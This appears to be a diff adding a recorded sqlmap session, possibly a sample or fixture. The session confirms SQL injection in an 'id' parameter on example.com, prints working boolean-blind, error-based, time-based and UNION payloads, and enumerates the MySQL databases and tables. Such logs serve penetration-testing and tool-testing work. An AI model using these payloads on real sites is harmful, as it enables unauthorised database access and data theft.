@@ -1,0 +1,75 @@
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.7.12#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[*] starting @ 10:30:00 /2024-01-15/
+
+[10:30:00] [INFO] testing connection to the target URL
+[10:30:01] [INFO] checking if the target is protected by some kind of WAF/IPS
+[10:30:01] [INFO] testing if the target URL content is stable
+[10:30:02] [INFO] target URL content is stable
+[10:30:02] [INFO] testing if GET parameter 'id' is dynamic
+[10:30:02] [INFO] GET parameter 'id' appears to be dynamic
+[10:30:02] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[10:30:02] [INFO] testing for SQL injection on GET parameter 'id'
+[10:30:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[10:30:03] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
+[10:30:03] [INFO] testing 'Generic inline queries'
+[10:30:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[10:30:04] [INFO] GET parameter 'id' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable
+[10:30:04] [INFO] testing 'MySQL inline queries'
+[10:30:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[10:30:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[10:30:15] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+[10:30:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[10:30:16] [INFO] automatically extending ranges for UNION query injection technique tests
+[10:30:17] [INFO] 'ORDER BY' technique appears to be usable
+[10:30:18] [INFO] target URL appears to have 5 columns in query
+[10:30:19] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 85 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5234=5234
+
+    Type: error-based
+    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
+    Payload: id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170787a71,(SELECT (ELT(5234=5234,1))),0x7162786a71,0x78))s), 8446744073709551610, 8446744073709551610)))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 5234 FROM (SELECT(SLEEP(5)))YYYY)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7170787a71,0x4f664e757a7746784a7956484b73616a6f69695963446e6c51564c49584d4e42547541794d716971,0x7162786a71),NULL,NULL,NULL--
+---
+[10:30:20] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.18.0, PHP 8.1.0
+back-end DBMS: MySQL >= 5.5
+[10:30:20] [INFO] fetching database names
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+[*] webapp_db
+
+[10:30:21] [INFO] fetching tables for database: 'webapp_db'
+Database: webapp_db
+[4 tables]
++-----------+
+| users     |
+| products  |
+| orders    |
+| sessions  |
++-----------+
+
+[10:30:22] [INFO] fetched data logged to text files under '/root/.sqlmap/output/example.com'
+
+[*] ending @ 10:30:22 /2024-01-15/
